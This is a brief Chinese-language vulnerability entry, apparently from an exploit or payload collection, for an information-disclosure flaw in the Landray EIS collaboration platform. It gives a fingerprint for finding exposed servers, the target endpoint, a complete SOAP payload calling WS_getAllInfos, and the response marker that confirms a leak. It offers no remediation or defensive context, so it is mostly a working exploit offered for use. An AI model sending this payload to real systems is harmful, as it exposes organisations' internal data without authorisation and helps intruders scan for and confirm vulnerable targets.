# 蓝凌EIS智慧协同平台WS_getAllInfos信息泄露漏洞

蓝凌EIS智慧协同平台WS_getAllInfos ｜ 信息泄露 ｜ —
- **指纹**：`app="Landray-EIS智慧协同平台"`
- **请求**：`POST /WS/Basic/Basic.asmx HTTP/1.1`

**Payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:WS_getAllInfos/>
</soapenv:Body>
</soapenv:Envelope>
```
- **响应特征**：200 WS_Department